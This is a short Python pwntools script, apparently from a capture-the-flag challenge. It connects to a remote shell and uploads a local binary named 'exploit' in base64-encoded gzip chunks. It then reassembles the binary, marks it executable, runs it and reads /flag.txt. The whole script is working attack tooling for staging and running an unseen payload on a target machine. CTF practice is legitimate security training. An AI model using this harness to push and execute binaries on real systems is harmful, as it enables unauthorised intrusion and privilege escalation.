#!/usr/bin/env python3

from pwn import *
from base64 import b64encode
import gzip

context.log_level = 'debug'


r = remote('0.0.0.0', 1337)
r.writelineafter(b'$', b'cd /home/ctf')

# open exploit and compress
expl = open('./exploit', 'rb').read()
expl = b64encode(gzip.compress(expl)).decode()
data = [expl[i:i+128] for i in range(0, len(expl), 128)]

# send exploit to server
for i, chunk in enumerate(data):
    r.writeline(f'echo -n {chunk} | base64 -d > expl.{i:04}'.encode())

# unzip exploit and clean up
r.writeline(b'cat expl* > exploit.gz && rm expl.*')
r.writeline(b'gzip -d exploit.gz')

# run exploit and read flag
r.writeline(b'chmod +x exploit && ./exploit')
r.writeline(b'cat /flag.txt')

r.interactive()
